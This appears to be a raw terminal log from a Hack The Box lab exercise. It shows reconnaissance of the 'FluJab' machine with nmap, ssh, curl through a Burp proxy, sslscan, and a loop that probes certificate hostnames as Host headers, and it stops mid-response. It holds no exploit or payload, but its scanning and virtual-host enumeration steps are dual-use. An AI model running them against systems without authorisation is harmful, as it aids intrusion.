@@ -1,0 +1,3297 @@
+root@kali:~/HTB/FluJab# nmap -p- --open flujab.htb
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-31 17:14 GMT
+Nmap scan report for flujab.htb (10.10.10.144)
+Host is up (0.00013s latency).
+rDNS record for 10.10.10.144: flujab.lan
+Not shown: 65531 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+443/tcp  open  https
+8080/tcp open  http-proxy
+MAC Address: 08:00:27:88:86:20 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 3.03 seconds
+root@kali:~/HTB/FluJab# ssh -vv flujab.htb 
+OpenSSH_7.9p1 Debian-4, OpenSSL 1.1.1a  20 Nov 2018
+debug1: Reading configuration data /root/.ssh/config
+debug1: Reading configuration data /etc/ssh/ssh_config
+debug1: /etc/ssh/ssh_config line 19: Applying options for *
+debug2: resolving "flujab.htb" port 22
+debug2: ssh_connect_direct
+debug1: Connecting to flujab.htb [10.10.10.144] port 22.
+debug1: Connection established.
+debug1: identity file /root/.ssh/id_rsa type 0
+debug1: identity file /root/.ssh/id_rsa-cert type -1
+debug1: identity file /root/.ssh/id_dsa type -1
+debug1: identity file /root/.ssh/id_dsa-cert type -1
+debug1: identity file /root/.ssh/id_ecdsa type -1
+debug1: identity file /root/.ssh/id_ecdsa-cert type -1
+debug1: identity file /root/.ssh/id_ed25519 type -1
+debug1: identity file /root/.ssh/id_ed25519-cert type -1
+debug1: identity file /root/.ssh/id_xmss type -1
+debug1: identity file /root/.ssh/id_xmss-cert type -1
+debug1: Local version string SSH-2.0-OpenSSH_7.9p1 Debian-4
+ssh_exchange_identification: read: Connection reset by peer
+root@kali:~/HTB/FluJab# curl -v http://flujab.htb 
+* Rebuilt URL to: http://flujab.htb/
+* Uses proxy env variable no_proxy == 'localhost,127.0.0.0/8,::1'
+* Uses proxy env variable http_proxy == 'http://127.0.0.1:8080/'
+*   Trying 127.0.0.1...
+* TCP_NODELAY set
+* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
+> GET http://flujab.htb/ HTTP/1.1
+> Host: flujab.htb
+> User-Agent: curl/7.61.0
+> Accept: */*
+> Proxy-Connection: Keep-Alive
+> 
+< HTTP/1.1 301 Moved Permanently
+< Date: Thu, 20 Dec 2018 00:33:52 GMT
+< Content-Type: text/html
+< Content-Length: 178
+< Connection: close
+< Location: https://flujab.htb/
+< Server: ClownWare Proxy
+< 
+<html>
+<head><title>301 Moved Permanently</title></head>
+<body bgcolor="white">
+<center><h1>301 Moved Permanently</h1></center>
+<hr><center>nginx</center>
+</body>
+</html>
+* Closing connection 0
+root@kali:~/HTB/FluJab# curl -v -k https://flujab.htb 
+* Rebuilt URL to: https://flujab.htb/
+* Uses proxy env variable no_proxy == 'localhost,127.0.0.0/8,::1'
+* Uses proxy env variable https_proxy == 'http://127.0.0.1:8080/'
+*   Trying 127.0.0.1...
+* TCP_NODELAY set
+* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
+* allocate connect buffer!
+* Establish HTTP proxy tunnel to flujab.htb:443
+> CONNECT flujab.htb:443 HTTP/1.1
+> Host: flujab.htb:443
+> User-Agent: curl/7.61.0
+> Proxy-Connection: Keep-Alive
+> 
+< HTTP/1.0 200 Connection established
+< 
+* Proxy replied 200 to CONNECT request
+* CONNECT phase completed!
+* ALPN, offering h2
+* ALPN, offering http/1.1
+* successfully set certificate verify locations:
+*   CAfile: none
+  CApath: /etc/ssl/certs
+* (304) (OUT), TLS handshake, Client hello (1):
+* CONNECT phase completed!
+* CONNECT phase completed!
+* (304) (IN), TLS handshake, Server hello (2):
+* TLSv1.2 (IN), TLS handshake, Certificate (11):
+* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
+* TLSv1.2 (IN), TLS handshake, Server finished (14):
+* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
+* TLSv1.2 (OUT), TLS change cipher, Client hello (1):
+* TLSv1.2 (OUT), TLS handshake, Finished (20):
+* TLSv1.2 (IN), TLS handshake, Finished (20):
+* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
+* ALPN, server did not agree to a protocol
+* Server certificate:
+*  subject: C=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=flujab.htb
+*  start date: Jan 21 17:26:12 2014 GMT
+*  expire date: Jan 21 17:26:12 2038 GMT
+*  issuer: C=PortSwigger; ST=PortSwigger; L=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=PortSwigger CA
+*  SSL certificate verify result: self signed certificate in certificate chain (19), continuing anyway.
+> GET / HTTP/1.1
+> Host: flujab.htb
+> User-Agent: curl/7.61.0
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+< Date: Thu, 20 Dec 2018 00:34:05 GMT
+< Content-Type: text/html; charset=UTF-8
+< Connection: close
+< Server: ClownWare Proxy
+< Content-Length: 3475
+< 
+<!DOCTYPE html>
+<!--[if lt IE 7]> <html class="no-js ie6 oldie" lang="en-US"> <![endif]-->
+<!--[if IE 7]>    <html class="no-js ie7 oldie" lang="en-US"> <![endif]-->
+<!--[if IE 8]>    <html class="no-js ie8 oldie" lang="en-US"> <![endif]-->
+<!--[if gt IE 8]><!-->
+<html class="js" style="opacity: 1; visibility: visible;" lang="en-US"><!--<![endif]--><head>
+<title>Direct IP access not allowed | ClownWare</title>
+<meta charset="UTF-8">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+<meta name="robots" content="noindex, nofollow">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<link rel="stylesheet" id="cf_styles-css" href="index_files/cf.css" type="text/css" media="screen,projection">
+<!--[if lt IE 9]><link rel="stylesheet" id='cf_styles-ie-css' href="/cdn-cgi/styles/cf.errors.ie.css" type="text/css" media="screen,projection" /><![endif]-->
+<style type="text/css">body{margin:0;padding:0}</style>
+
+
+<!--[if gte IE 10]><!--><script type="text/javascript" src="index_files/zepto.js"></script><!--<![endif]-->
+<!--[if gte IE 10]><!--><script type="text/javascript" src="index_files/cf.js"></script><!--<![endif]-->
+
+
+
+</head>
+<body>
+  <div id="cf-wrapper">
+    <div class="cf-alert cf-alert-error cf-cookie-error" id="cookie-alert" data-translate="enable_cookies">Please enable cookies.</div>
+    <div id="cf-error-details" class="cf-error-details-wrapper">
+      <div class="cf-wrapper cf-header cf-error-overview">
+        <h1>
+          <span class="cf-error-type" data-translate="error">Error</span>
+          <span class="cf-error-code">1003</span>
+          <small class="heading-ray-id">Ray ID: 8200faea05db2a70
+ • 2018-12-20 00:34:05 GMT
+</small>
+        </h1>
+        <h2 class="cf-subheadline">Direct IP access not allowed</h2>
+      </div><!-- /.header -->
+
+      <section></section><!-- spacer -->
+
+      <div class="cf-section cf-wrapper">
+        <div class="cf-columns two">
+          <div class="cf-column">
+            <h2 data-translate="what_happened">What happened?</h2>
+            <p>You've requested an IP address that is part of the <a href="https://clownware.htb/link.php" target="https://clownware.htb/link.php">ClownWare</a> network. A valid Host header must be supplied to reach the desired website.</p>
+          </div>
+
+          
+          <div class="cf-column">
+            <h2 data-translate="what_can_i_do">What can I do?</h2>
+            <p>If you are interested in learning more about ClownWare, please <a href="https://clownware.htb/link.php" target="https://clownware.htb/link.php">visit our website</a>.</p>
+          </div>
+          
+        </div>
+      </div><!-- /.section -->
+
+      <div class="cf-error-footer cf-wrapper">
+  <p>
+    <span class="cf-footer-item">ClownWare Ray ID: <strong>a6bfdb8e3f25f144
+</strong></span>
+    <span class="cf-footer-separator">•</span>
+    <span class="cf-footer-item"><span>Your IP</span>: 20.20.20.81</span>
+    <span class="cf-footer-separator">•</span>
+    <span class="cf-footer-item"><span>Performance &amp; security by</span> <a href="https://clownware.htb/link.php" id="brand_link" target="https://clownware.htb/link.php">ClownWare</a></span>
+    
+  </p>
+</div><!-- /.error-footer -->
+
+
+    </div><!-- /#cf-error-details -->
+  </div><!-- /#cf-wrapper -->
+
+  <script type="text/javascript">
+  window._cf_translation = {};
+  
+  
+</script>
+
+
+
+* Closing connection 0
+* TLSv1.2 (OUT), TLS alert, Client hello (1):
+</body></html>root@kali:~/HTB/FluJab# sslscan https://flujab.htb 
+Version: 1.11.12-static
+OpenSSL 1.0.2-chacha (1.0.2g-dev)
+
+Connected to 10.10.10.144
+
+Testing SSL server flujab.htb on port 443 using SNI name flujab.htb
+
+  TLS Fallback SCSV:
+Server supports TLS Fallback SCSV
+
+  TLS renegotiation:
+Secure session renegotiation supported
+
+  TLS Compression:
+Compression disabled
+
+  Heartbleed:
+TLS 1.2 not vulnerable to heartbleed
+TLS 1.1 not vulnerable to heartbleed
+TLS 1.0 not vulnerable to heartbleed
+
+  Supported Server Cipher(s):
+Preferred TLSv1.2  256 bits  ECDHE-RSA-AES256-GCM-SHA384   Curve P-256 DHE 256
+Accepted  TLSv1.2  256 bits  DHE-RSA-AES256-GCM-SHA384     DHE 1024 bits
+Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-GCM-SHA256   Curve P-256 DHE 256
+Accepted  TLSv1.2  128 bits  DHE-RSA-AES128-GCM-SHA256     DHE 1024 bits
+Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA384       Curve P-256 DHE 256
+Accepted  TLSv1.2  256 bits  DHE-RSA-AES256-SHA256         DHE 1024 bits
+Accepted  TLSv1.2  256 bits  ECDHE-RSA-CAMELLIA256-SHA384  Curve P-256 DHE 256
+Accepted  TLSv1.2  256 bits  DHE-RSA-CAMELLIA256-SHA256    DHE 1024 bits
+Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA256       Curve P-256 DHE 256
+Accepted  TLSv1.2  128 bits  DHE-RSA-AES128-SHA256         DHE 1024 bits
+Accepted  TLSv1.2  128 bits  ECDHE-RSA-CAMELLIA128-SHA256  Curve P-256 DHE 256
+Accepted  TLSv1.2  128 bits  DHE-RSA-CAMELLIA128-SHA256    DHE 1024 bits
+Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
+Accepted  TLSv1.2  256 bits  DHE-RSA-AES256-SHA            DHE 1024 bits
+Accepted  TLSv1.2  256 bits  DHE-RSA-CAMELLIA256-SHA       DHE 1024 bits
+Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
+Accepted  TLSv1.2  128 bits  DHE-RSA-AES128-SHA            DHE 1024 bits
+Accepted  TLSv1.2  128 bits  DHE-RSA-CAMELLIA128-SHA       DHE 1024 bits
+Accepted  TLSv1.2  256 bits  AES256-GCM-SHA384            
+Accepted  TLSv1.2  128 bits  AES128-GCM-SHA256            
+Accepted  TLSv1.2  256 bits  AES256-SHA256                
+Accepted  TLSv1.2  256 bits  CAMELLIA256-SHA256           
+Accepted  TLSv1.2  128 bits  AES128-SHA256                
+Accepted  TLSv1.2  128 bits  CAMELLIA128-SHA256           
+Accepted  TLSv1.2  256 bits  AES256-SHA                   
+Accepted  TLSv1.2  256 bits  CAMELLIA256-SHA              
+Accepted  TLSv1.2  128 bits  AES128-SHA                   
+Accepted  TLSv1.2  128 bits  CAMELLIA128-SHA              
+Preferred TLSv1.1  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
+Accepted  TLSv1.1  256 bits  DHE-RSA-AES256-SHA            DHE 1024 bits
+Accepted  TLSv1.1  256 bits  DHE-RSA-CAMELLIA256-SHA       DHE 1024 bits
+Accepted  TLSv1.1  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
+Accepted  TLSv1.1  128 bits  DHE-RSA-AES128-SHA            DHE 1024 bits
+Accepted  TLSv1.1  128 bits  DHE-RSA-CAMELLIA128-SHA       DHE 1024 bits
+Accepted  TLSv1.1  256 bits  AES256-SHA                   
+Accepted  TLSv1.1  256 bits  CAMELLIA256-SHA              
+Accepted  TLSv1.1  128 bits  AES128-SHA                   
+Accepted  TLSv1.1  128 bits  CAMELLIA128-SHA              
+Preferred TLSv1.0  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
+Accepted  TLSv1.0  256 bits  DHE-RSA-AES256-SHA            DHE 1024 bits
+Accepted  TLSv1.0  256 bits  DHE-RSA-CAMELLIA256-SHA       DHE 1024 bits
+Accepted  TLSv1.0  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
+Accepted  TLSv1.0  128 bits  DHE-RSA-AES128-SHA            DHE 1024 bits
+Accepted  TLSv1.0  128 bits  DHE-RSA-CAMELLIA128-SHA       DHE 1024 bits
+Accepted  TLSv1.0  256 bits  AES256-SHA                   
+Accepted  TLSv1.0  256 bits  CAMELLIA256-SHA              
+Accepted  TLSv1.0  128 bits  AES128-SHA                   
+Accepted  TLSv1.0  128 bits  CAMELLIA128-SHA              
+
+  SSL Certificate:
+Signature Algorithm: sha256WithRSAEncryption
+RSA Key Strength:    4096
+
+Subject:  ClownWare.htb
+Altnames: DNS:clownware.htb, DNS:sni147831.clownware.htb, DNS:*.clownware.htb, DNS:proxy.clownware.htb, DNS:console.flujab.htb, DNS:sys.flujab.htb, DNS:smtp.flujab.htb, DNS:vaccine4flu.htb, DNS:bestmedsupply.htb, DNS:custoomercare.megabank.htb, DNS:flowerzrus.htb, DNS:chocolateriver.htb, DNS:meetspinz.htb, DNS:rubberlove.htb, DNS:freeflujab.htb, DNS:flujab.htb
+Issuer:   ClownWare Certificate Authority
+
+Not valid before: Nov 28 14:57:03 2018 GMT
+Not valid after:  Nov 27 14:57:03 2023 GMT
+root@kali:~/HTB/FluJab# mkdir FluJab
+root@kali:~/HTB/FluJab# cd FluJab/
+root@kali:~/HTB/FluJab# nano alt_names.txt
+root@kali:~/HTB/FluJab# sed -i s'/, DNS:/\n/'g alt_names.txt 
+root@kali:~/HTB/FluJab# cat alt_names.txt 
+clownware.htb
+sni147831.clownware.htb
+*.clownware.htb
+proxy.clownware.htb
+console.flujab.htb
+sys.flujab.htb
+smtp.flujab.htb
+vaccine4flu.htb
+bestmedsupply.htb
+custoomercare.megabank.htb
+flowerzrus.htb
+chocolateriver.htb
+meetspinz.htb
+rubberlove.htb
+freeflujab.htb
+flujab.htb
+root@kali:~/HTB/FluJab# for D in $(cat alt_names.txt); do printf $"\n\n$D\n---------------------"curl -v -k https://10.10.10.144/ -H "Host: $D";done
+
+
+clownware.htb
+---------------------curl
+
+sni147831.clownware.htb
+---------------------curl
+
+*.clownware.htb
+---------------------curl
+
+proxy.clownware.htb
+---------------------curl
+
+console.flujab.htb
+---------------------curl
+
+sys.flujab.htb
+---------------------curl
+
+smtp.flujab.htb
+---------------------curl
+
+vaccine4flu.htb
+---------------------curl
+
+bestmedsupply.htb
+---------------------curl
+
+custoomercare.megabank.htb
+---------------------curl
+
+flowerzrus.htb
+---------------------curl
+
+chocolateriver.htb
+---------------------curl
+
+meetspinz.htb
+---------------------curl
+
+rubberlove.htb
+---------------------curl
+
+freeflujab.htb
+---------------------curl
+
+flujab.htb
+root@kali:~/HTB/FluJab# lroot@kali:~/HTB/FluJab# for D in $(cat alt_names.txt); do printf $"\n\n$D\n---------------------" && curl 20.144/ -H "Host: $D";done0.144/ -H
+root@kali:~/HTB/FluJab# for D in $(cat alt_names.txt); do printf $"\n\n$D\n---------------------"curl -v -k https://20.20. && curl 20.144/ -H "Host: $D";done
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+root@kali:~/HTB/FluJab# for D in $(cat alt_names.txt); do printf $"\n\n$D\n---------------------" && curl -v -k https://10.10.10.144/ -H "Host: $D";done
+
+
+clownware.htb
+---------------------* Uses proxy env variable no_proxy == 'localhost,127.0.0.0/8,::1'
+* Uses proxy env variable https_proxy == 'http://127.0.0.1:8080/'
+*   Trying 127.0.0.1...
+* TCP_NODELAY set
+* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
+* allocate connect buffer!
+* Establish HTTP proxy tunnel to 10.10.10.144:443
+> CONNECT 10.10.10.144:443 HTTP/1.1
+> Host: 10.10.10.144:443
+> User-Agent: curl/7.61.0
+> Proxy-Connection: Keep-Alive
+> 
+< HTTP/1.0 200 Connection established
+< 
+* Proxy replied 200 to CONNECT request
+* CONNECT phase completed!
+* ALPN, offering h2
+* ALPN, offering http/1.1
+* successfully set certificate verify locations:
+*   CAfile: none
+  CApath: /etc/ssl/certs
+* (304) (OUT), TLS handshake, Client hello (1):
+* CONNECT phase completed!
+* CONNECT phase completed!
+* (304) (IN), TLS handshake, Server hello (2):
+* TLSv1.2 (IN), TLS handshake, Certificate (11):
+* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
+* TLSv1.2 (IN), TLS handshake, Server finished (14):
+* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
+* TLSv1.2 (OUT), TLS change cipher, Client hello (1):
+* TLSv1.2 (OUT), TLS handshake, Finished (20):
+* TLSv1.2 (IN), TLS handshake, Finished (20):
+* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
+* ALPN, server did not agree to a protocol
+* Server certificate:
+*  subject: C=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=ClownWare.htb
+*  start date: Jan 21 17:26:12 2014 GMT
+*  expire date: Jan 21 17:26:12 2038 GMT
+*  issuer: C=PortSwigger; ST=PortSwigger; L=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=PortSwigger CA
+*  SSL certificate verify result: self signed certificate in certificate chain (19), continuing anyway.
+> GET / HTTP/1.1
+> Host: clownware.htb
+> User-Agent: curl/7.61.0
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+< Date: Thu, 20 Dec 2018 00:41:09 GMT
+< Content-Type: text/html; charset=UTF-8
+< Connection: close
+< Server: ClownWare Proxy
+< Content-Length: 3475
+< 
+<!DOCTYPE html>
+<!--[if lt IE 7]> <html class="no-js ie6 oldie" lang="en-US"> <![endif]-->
+<!--[if IE 7]>    <html class="no-js ie7 oldie" lang="en-US"> <![endif]-->
+<!--[if IE 8]>    <html class="no-js ie8 oldie" lang="en-US"> <![endif]-->
+<!--[if gt IE 8]><!-->
+<html class="js" style="opacity: 1; visibility: visible;" lang="en-US"><!--<![endif]--><head>
+<title>Direct IP access not allowed | ClownWare</title>
+<meta charset="UTF-8">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+<meta name="robots" content="noindex, nofollow">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<link rel="stylesheet" id="cf_styles-css" href="index_files/cf.css" type="text/css" media="screen,projection">
+<!--[if lt IE 9]><link rel="stylesheet" id='cf_styles-ie-css' href="/cdn-cgi/styles/cf.errors.ie.css" type="text/css" media="screen,projection" /><![endif]-->
+<style type="text/css">body{margin:0;padding:0}</style>
+
+
+<!--[if gte IE 10]><!--><script type="text/javascript" src="index_files/zepto.js"></script><!--<![endif]-->
+<!--[if gte IE 10]><!--><script type="text/javascript" src="index_files/cf.js"></script><!--<![endif]-->
+
+
+
+</head>
+<body>
+  <div id="cf-wrapper">
+    <div class="cf-alert cf-alert-error cf-cookie-error" id="cookie-alert" data-translate="enable_cookies">Please enable cookies.</div>
+    <div id="cf-error-details" class="cf-error-details-wrapper">
+      <div class="cf-wrapper cf-header cf-error-overview">
+        <h1>
+          <span class="cf-error-type" data-translate="error">Error</span>
+          <span class="cf-error-code">1003</span>
+          <small class="heading-ray-id">Ray ID: 58174bcaeee9d85d
+ • 2018-12-20 00:41:09 GMT
+</small>
+        </h1>
+        <h2 class="cf-subheadline">Direct IP access not allowed</h2>
+      </div><!-- /.header -->
+
+      <section></section><!-- spacer -->
+
+      <div class="cf-section cf-wrapper">
+        <div class="cf-columns two">
+          <div class="cf-column">
+            <h2 data-translate="what_happened">What happened?</h2>
+            <p>You've requested an IP address that is part of the <a href="https://clownware.htb/link.php" target="https://clownware.htb/link.php">ClownWare</a> network. A valid Host header must be supplied to reach the desired website.</p>
+          </div>
+
+          
+          <div class="cf-column">
+            <h2 data-translate="what_can_i_do">What can I do?</h2>
+            <p>If you are interested in learning more about ClownWare, please <a href="https://clownware.htb/link.php" target="https://clownware.htb/link.php">visit our website</a>.</p>
+          </div>
+          
+        </div>
+      </div><!-- /.section -->
+
+      <div class="cf-error-footer cf-wrapper">
+  <p>
+    <span class="cf-footer-item">ClownWare Ray ID: <strong>fafc46a6aae9d686
+</strong></span>
+    <span class="cf-footer-separator">•</span>
+    <span class="cf-footer-item"><span>Your IP</span>: 20.20.20.81</span>
+    <span class="cf-footer-separator">•</span>
+    <span class="cf-footer-item"><span>Performance &amp; security by</span> <a href="https://clownware.htb/link.php" id="brand_link" target="https://clownware.htb/link.php">ClownWare</a></span>
+    
+  </p>
+</div><!-- /.error-footer -->
+
+
+    </div><!-- /#cf-error-details -->
+  </div><!-- /#cf-wrapper -->
+
+  <script type="text/javascript">
+  window._cf_translation = {};
+  
+  
+</script>
+
+
+
+* Closing connection 0
+* TLSv1.2 (OUT), TLS alert, Client hello (1):
+</body></html>
+
+sni147831.clownware.htb
+---------------------* Uses proxy env variable no_proxy == 'localhost,127.0.0.0/8,::1'
+* Uses proxy env variable https_proxy == 'http://127.0.0.1:8080/'
+*   Trying 127.0.0.1...
+* TCP_NODELAY set
+* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
+* allocate connect buffer!
+* Establish HTTP proxy tunnel to 10.10.10.144:443
+> CONNECT 10.10.10.144:443 HTTP/1.1
+> Host: 10.10.10.144:443
+> User-Agent: curl/7.61.0
+> Proxy-Connection: Keep-Alive
+> 
+< HTTP/1.0 200 Connection established
+< 
+* Proxy replied 200 to CONNECT request
+* CONNECT phase completed!
+* ALPN, offering h2
+* ALPN, offering http/1.1
+* successfully set certificate verify locations:
+*   CAfile: none
+  CApath: /etc/ssl/certs
+* (304) (OUT), TLS handshake, Client hello (1):
+* CONNECT phase completed!
+* CONNECT phase completed!
+* (304) (IN), TLS handshake, Server hello (2):
+* TLSv1.2 (IN), TLS handshake, Certificate (11):
+* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
+* TLSv1.2 (IN), TLS handshake, Server finished (14):
+* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
+* TLSv1.2 (OUT), TLS change cipher, Client hello (1):
+* TLSv1.2 (OUT), TLS handshake, Finished (20):
+* TLSv1.2 (IN), TLS handshake, Finished (20):
+* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
+* ALPN, server did not agree to a protocol
+* Server certificate:
+*  subject: C=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=ClownWare.htb
+*  start date: Jan 21 17:26:12 2014 GMT
+*  expire date: Jan 21 17:26:12 2038 GMT
+*  issuer: C=PortSwigger; ST=PortSwigger; L=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=PortSwigger CA
+*  SSL certificate verify result: self signed certificate in certificate chain (19), continuing anyway.
+> GET / HTTP/1.1
+> Host: sni147831.clownware.htb
+> User-Agent: curl/7.61.0
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+< Date: Thu, 20 Dec 2018 00:41:09 GMT
+< Content-Type: text/html; charset=UTF-8
+< Connection: close
+< Server: ClownWare Proxy
+< Content-Length: 3475
+< 
+<!DOCTYPE html>
+<!--[if lt IE 7]> <html class="no-js ie6 oldie" lang="en-US"> <![endif]-->
+<!--[if IE 7]>    <html class="no-js ie7 oldie" lang="en-US"> <![endif]-->
+<!--[if IE 8]>    <html class="no-js ie8 oldie" lang="en-US"> <![endif]-->
+<!--[if gt IE 8]><!-->
+<html class="js" style="opacity: 1; visibility: visible;" lang="en-US"><!--<![endif]--><head>
+<title>Direct IP access not allowed | ClownWare</title>
+<meta charset="UTF-8">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+<meta name="robots" content="noindex, nofollow">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<link rel="stylesheet" id="cf_styles-css" href="index_files/cf.css" type="text/css" media="screen,projection">
+<!--[if lt IE 9]><link rel="stylesheet" id='cf_styles-ie-css' href="/cdn-cgi/styles/cf.errors.ie.css" type="text/css" media="screen,projection" /><![endif]-->
+<style type="text/css">body{margin:0;padding:0}</style>
+
+
+<!--[if gte IE 10]><!--><script type="text/javascript" src="index_files/zepto.js"></script><!--<![endif]-->
+<!--[if gte IE 10]><!--><script type="text/javascript" src="index_files/cf.js"></script><!--<![endif]-->
+
+
+
+</head>
+<body>
+  <div id="cf-wrapper">
+    <div class="cf-alert cf-alert-error cf-cookie-error" id="cookie-alert" data-translate="enable_cookies">Please enable cookies.</div>
+    <div id="cf-error-details" class="cf-error-details-wrapper">
+      <div class="cf-wrapper cf-header cf-error-overview">
+        <h1>
+          <span class="cf-error-type" data-translate="error">Error</span>
+          <span class="cf-error-code">1003</span>
+          <small class="heading-ray-id">Ray ID: 0229d06e91a4ba7d
+ • 2018-12-20 00:41:09 GMT
+</small>
+        </h1>
+        <h2 class="cf-subheadline">Direct IP access not allowed</h2>
+      </div><!-- /.header -->
+
+      <section></section><!-- spacer -->
+
+      <div class="cf-section cf-wrapper">
+        <div class="cf-columns two">
+          <div class="cf-column">
+            <h2 data-translate="what_happened">What happened?</h2>
+            <p>You've requested an IP address that is part of the <a href="https://clownware.htb/link.php" target="https://clownware.htb/link.php">ClownWare</a> network. A valid Host header must be supplied to reach the desired website.</p>
+          </div>
+
+          
+          <div class="cf-column">
+            <h2 data-translate="what_can_i_do">What can I do?</h2>
+            <p>If you are interested in learning more about ClownWare, please <a href="https://clownware.htb/link.php" target="https://clownware.htb/link.php">visit our website</a>.</p>
+          </div>
+          
+        </div>
+      </div><!-- /.section -->
+
+      <div class="cf-error-footer cf-wrapper">
+  <p>
+    <span class="cf-footer-item">ClownWare Ray ID: <strong>b0dafa1dd9b81b68
+</strong></span>
+    <span class="cf-footer-separator">•</span>
+    <span class="cf-footer-item"><span>Your IP</span>: 20.20.20.81</span>
+    <span class="cf-footer-separator">•</span>
+    <span class="cf-footer-item"><span>Performance &amp; security by</span> <a href="https://clownware.htb/link.php" id="brand_link" target="https://clownware.htb/link.php">ClownWare</a></span>
+    
+  </p>
+</div><!-- /.error-footer -->
+
+
+    </div><!-- /#cf-error-details -->
+  </div><!-- /#cf-wrapper -->
+
+  <script type="text/javascript">
+  window._cf_translation = {};
+  
+  
+</script>
+
+
+
+* Closing connection 0
+* TLSv1.2 (OUT), TLS alert, Client hello (1):
+</body></html>
+
+*.clownware.htb
+---------------------* Uses proxy env variable no_proxy == 'localhost,127.0.0.0/8,::1'
+* Uses proxy env variable https_proxy == 'http://127.0.0.1:8080/'
+*   Trying 127.0.0.1...
+* TCP_NODELAY set
+* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
+* allocate connect buffer!
+* Establish HTTP proxy tunnel to 10.10.10.144:443
+> CONNECT 10.10.10.144:443 HTTP/1.1
+> Host: 10.10.10.144:443
+> User-Agent: curl/7.61.0
+> Proxy-Connection: Keep-Alive
+> 
+< HTTP/1.0 200 Connection established
+< 
+* Proxy replied 200 to CONNECT request
+* CONNECT phase completed!
+* ALPN, offering h2
+* ALPN, offering http/1.1
+* successfully set certificate verify locations:
+*   CAfile: none
+  CApath: /etc/ssl/certs
+* (304) (OUT), TLS handshake, Client hello (1):
+* CONNECT phase completed!
+* CONNECT phase completed!
+* (304) (IN), TLS handshake, Server hello (2):
+* TLSv1.2 (IN), TLS handshake, Certificate (11):
+* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
+* TLSv1.2 (IN), TLS handshake, Server finished (14):
+* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
+* TLSv1.2 (OUT), TLS change cipher, Client hello (1):
+* TLSv1.2 (OUT), TLS handshake, Finished (20):
+* TLSv1.2 (IN), TLS handshake, Finished (20):
+* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
+* ALPN, server did not agree to a protocol
+* Server certificate:
+*  subject: C=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=ClownWare.htb
+*  start date: Jan 21 17:26:12 2014 GMT
+*  expire date: Jan 21 17:26:12 2038 GMT
+*  issuer: C=PortSwigger; ST=PortSwigger; L=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=PortSwigger CA
+*  SSL certificate verify result: self signed certificate in certificate chain (19), continuing anyway.
+> GET / HTTP/1.1
+> Host: *.clownware.htb
+> User-Agent: curl/7.61.0
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+< Date: Thu, 20 Dec 2018 00:41:09 GMT
+< Content-Type: text/html; charset=UTF-8
+< Connection: close
+< Server: ClownWare Proxy
+< Content-Length: 3475
+< 
+<!DOCTYPE html>
+<!--[if lt IE 7]> <html class="no-js ie6 oldie" lang="en-US"> <![endif]-->
+<!--[if IE 7]>    <html class="no-js ie7 oldie" lang="en-US"> <![endif]-->
+<!--[if IE 8]>    <html class="no-js ie8 oldie" lang="en-US"> <![endif]-->
+<!--[if gt IE 8]><!-->
+<html class="js" style="opacity: 1; visibility: visible;" lang="en-US"><!--<![endif]--><head>
+<title>Direct IP access not allowed | ClownWare</title>
+<meta charset="UTF-8">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
